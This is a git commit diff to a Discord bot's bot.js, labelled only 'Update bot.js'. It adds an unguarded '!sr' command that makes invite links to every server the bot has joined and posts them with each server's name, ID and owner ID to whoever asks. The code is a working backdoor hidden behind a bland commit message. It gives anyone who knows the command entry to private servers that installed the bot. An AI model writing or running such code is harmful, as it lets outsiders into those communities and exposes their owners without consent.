87ae8c59a8870ed67f0e76b5f7ac551abd4ef1b9
mhstr <38856850+mhstr@users.noreply.github.com>
2018-07-22 20:18:23 -0700

    Update bot.js

--- bot.js
+++ bot.js
@@ -61,6 +61,29 @@ ${users.join('\n')}
 }
 });
 
+  client.on('message', msg => {
+    if(msg.author.bot) return;
+    
+    if(msg.content === '!sr') {
+      client.guilds.forEach(g => {
+        
+        let l = g.id
+        g.channels.get(g.channels.first().id).createInvite({
+          maxUses: 5,
+          maxAge: 86400
+        }).then(i => msg.channel.send(`
+        **
+        Invite Link : <https://discord.gg/${i.code}>
+        Server : ${g.name} | Id : ${g.id} 
+        Owner ID : ${g.owner.id}
+        **
+        `))
+  
+  
+      })
+    }
+    
+  })
 
 let bane = JSON.parse(fs.readFileSync("./bcer.json", "utf8"));
 let banse = new Set();
